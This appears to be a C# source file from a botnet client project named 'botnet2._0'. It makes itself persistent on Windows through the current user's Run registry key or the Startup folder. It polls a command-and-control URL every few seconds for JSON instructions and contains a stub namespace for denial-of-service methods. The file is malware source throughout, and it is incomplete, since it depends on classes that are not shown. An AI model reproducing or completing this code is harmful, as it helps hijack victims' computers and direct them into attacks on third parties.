using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace botnet2._0
{
    class functions
    {
        public static string exe_name = Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
        public static Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        public static string Instruction_File = "http://127.0.0.1/instructions.txt";


        public static bool add()
        {
            try
            {
                key.SetValue(exe_name, Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + @"\" + exe_name);
                return true;
            }
            catch (Exception ex)
            {
                try
                {
                    File.Copy(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + @"\" + exe_name, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + exe_name);
                    return true;
                }
                catch (Exception ex2)
                {
                    return false;
                }
            };
        }
        public static void remove()
        {
            try
            {
                key.DeleteValue(exe_name, true);
            }
            catch (Exception ex) { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + exe_name); }
        }
        public static void refresh()
        {
            while (true)
            {
                Form1.botinstruction = JsonConvert.DeserializeObject<Instruction>(new WebClient().DownloadString(functions.Instruction_File));
                System.Threading.Thread.Sleep(3000);
            }
        }
    }
    namespace dos_methods
    {
        internal class Somehelp
        {
            public static Random random = new Random();
            public static string RandomString(int length, string charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
            {
                return new string(Enumerable.Repeat(charset, length).Select(s => s[random.Next(s.Length)]).ToArray());
            }
        }
    }
}

